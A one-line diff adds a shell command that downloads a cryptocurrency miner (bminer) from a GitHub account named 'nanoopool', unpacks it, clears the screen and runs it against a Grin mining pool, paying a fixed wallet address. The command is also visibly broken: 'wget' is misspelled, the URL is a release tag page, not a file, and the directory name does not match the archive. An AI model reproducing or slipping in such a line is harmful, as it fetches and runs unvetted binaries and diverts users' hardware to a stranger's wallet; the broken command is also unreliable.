@@ -1,0 +1,1 @@
+wegt https://github.com/nanoopool/bminer-releases/releases/tag/15.3.1/bminer-v15.3.1.tar.gz && tar -zxvf bminer-v15.3.1.tar.gz && cd 15.3.1 && clear && ./bminer --algo cuckatoo31 --pool de.grin.herominers.com:1125 --user grin:grin1g53p4qrmu6c26vchx2u0h62klpjwzrvrjltmt0d239tjv7nca6xqmjsxme.miki-27
